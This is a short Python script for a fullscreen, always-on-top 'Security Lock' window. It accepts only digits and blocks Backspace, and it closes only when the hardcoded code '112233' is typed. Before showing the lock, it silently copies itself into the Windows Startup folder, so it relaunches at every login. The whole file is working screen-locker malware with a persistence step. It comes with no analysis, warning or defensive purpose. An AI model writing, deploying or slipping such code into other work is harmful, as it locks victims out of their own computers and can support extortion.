import tkinter as tk
import os
import sys
import shutil

def key_press(event):
    if event.char not in '0123456789':
        return "break"
    if entry.get() + event.char == "112233":
        root.destroy()

def create_locker():
    global root, entry
    root = tk.Tk()
    root.title("Security Lock")
    root.attributes("-fullscreen", True)
    root.configure(bg="black")
    root.attributes("-topmost", True)
    
    label = tk.Label(root, text="Enter Secret Key", fg="white", bg="black", font=("Arial", 24))
    label.pack(pady=30)

    entry = tk.Entry(root, show="*", font=("Arial", 24), justify="center")
    entry.pack()
    entry.bind("<KeyPress>", key_press)

    root.mainloop()

def add_to_startup():
    if getattr(sys, 'frozen', False):
        exe_path = sys.executable
    else:
        exe_path = os.path.abspath(__file__)

    startup_dir = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
    dest_path = os.path.join(startup_dir, os.path.basename(exe_path))

    if not os.path.exists(dest_path):
        shutil.copyfile(exe_path, dest_path)

if __name__ == "__main__":
    add_to_startup()
    create_locker()
